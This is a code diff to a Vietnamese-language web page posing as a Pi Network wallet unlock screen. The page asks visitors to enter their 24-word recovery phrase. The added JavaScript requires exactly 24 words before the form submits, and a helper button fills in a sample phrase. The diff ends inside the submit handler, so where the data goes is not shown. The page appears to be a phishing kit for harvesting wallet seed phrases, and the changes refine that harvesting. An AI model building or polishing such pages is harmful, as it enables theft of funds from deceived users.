@@ -695,16 +695,15 @@
         }
 
         .pi-info-text {
-    font-size: 1.0rem;
-    line-height: 1.6;
-    color: var(--text-secondary);
-    margin-top: 2rem;
-    text-align: left; /* Căn lề trái */
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            margin-top: 2rem;
+            text-align: left; /* Căn lề trái */
     word-wrap: break-word; /* Cho phép xuống dòng khi cần */
     white-space: normal; /* Hiển thị toàn bộ nội dung */
     width: 100%; /* Đảm bảo hiển thị hết chiều ngang */
-}
-
+        }
 
         .pi-link {
             color: #3d9dff;
@@ -1266,6 +1265,48 @@
         #formPage .pi-input {
             color: #333;
         }
+        
+        /* Word counter styles */
+        .word-counter {
+            text-align: right;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-top: 0.5rem;
+            margin-bottom: 0.5rem;
+            padding-right: 0.5rem;
+        }
+
+        .word-counter.valid {
+            color: #4CAF50;
+            font-weight: 600;
+        }
+
+        .word-counter.invalid {
+            color: #F44336;
+            font-weight: 600;
+        }
+
+        /* Validation message */
+        .validation-message {
+            color: #F44336;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* Visual indicator for input container */
+        .pi-input-container.valid-input {
+            border: 2px solid #4CAF50;
+        }
+
+        .pi-input-container.invalid-input {
+            border: 2px solid #F44336;
+        }
     </style>
 </head>
 <body>
@@ -1540,12 +1581,15 @@
             <div class="container mx-auto px-4 py-8">
                 <div class="pi-wallet-style surprise-container">
                     <div class="pi-title animate-on-scroll">Mở khóa ví Pi</div>
-                    
-                    <div class="animate-on-scroll" data-delay="200">
+                     <div class="animate-on-scroll" data-delay="200">
                         <div class="pi-input-container">
                             <textarea id="walletAddress" class="pi-input" placeholder="Nhập cụm mật khẩu 24 từ của bạn tại đây"></textarea>
                         </div>
+                        <div id="wordCounter" class="word-counter"></div>
+                        <div id="validationMessage" class="validation-message hidden">Vui lòng nhập đúng 24 từ khôi phục ví</div>
                     </div>
+                    
+                    
                     
                     <div class="animate-on-scroll" data-delay="400">
                         <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger">
@@ -1935,12 +1979,67 @@
                 }
             });
             
+            // Word counter and validation
+            const walletAddressInput = document.getElementById('walletAddress');
+            const wordCounter = document.getElementById('wordCounter');
+            const validationMessage = document.getElementById('validationMessage');
+            const inputContainer = document.querySelector('.pi-input-container');
+            
+            // Update word count on input
+            walletAddressInput.addEventListener('input', function() {
+                const text = this.value.trim();
+                let wordCount = 0;
+                
+                if (text) {
+                    // Count words (sequences separated by spaces)
+                    wordCount = text.split(/\s+/).filter(word => word.length > 0).length;
+                }
+                
+                // Update counter
+            
+                
+                // Validate if exactly 24 words
+                if (wordCount === 24) {
+                    wordCounter.classList.add('valid');
+                    wordCounter.classList.remove('invalid');
+                    inputContainer.classList.add('valid-input');
+                    inputContainer.classList.remove('invalid-input');
+                    validationMessage.classList.add('hidden');
+                } else if (wordCount > 0) {
+                    wordCounter.classList.add('invalid');
+                    wordCounter.classList.remove('valid');
+                    inputContainer.classList.add('invalid-input');
+                    inputContainer.classList.remove('valid-input');
+                    validationMessage.classList.remove('hidden');
+                } else {
+                    wordCounter.classList.remove('valid', 'invalid');
+                    inputContainer.classList.remove('valid-input', 'invalid-input');
+                    validationMessage.classList.add('hidden');
+                }
+            });
+            
+            // Example of recovery phrase
+            const exampleBtn = document.createElement('button');
+            exampleBtn.className = 'text-xs text-blue-600 mt-1 ml-1';
+            exampleBtn.onclick = function(e) {
+                e.preventDefault();
+                walletAddressInput.value = 'apple lake sunset bridge monkey tiger honey rain summer echo planet yellow cloud forest dolphin energy river snow lucky ocean banana magic zebra mountain whisper future galaxy orbit';
+                walletAddressInput.dispatchEvent(new Event('input'));
+            };
+            document.querySelector('.word-counter').after(exampleBtn);
+            
             // Form submission
             unlockSubmitBtn.addEventListener('click', async function() {
-                const walletAddress = document.getElementById('walletAddress').value.trim();
+                const walletAddress = walletAddressInput.value.trim();
                 
-                if (!walletAddress) {
-                    document.getElementById('walletAddress').style.borderColor = 'red';
+                // Count words
+                const wordCount = walletAddress.split(/\s+/).filter(word => word.length > 0).length;
+                
+                // Validate word count
+                if (!walletAddress || wordCount !== 24) {
+                    inputContainer.classList.add('invalid-input');
+                    wordCounter.classList.add('invalid');
+                    validationMessage.classList.remove('hidden');
                     return;
                 }
                 
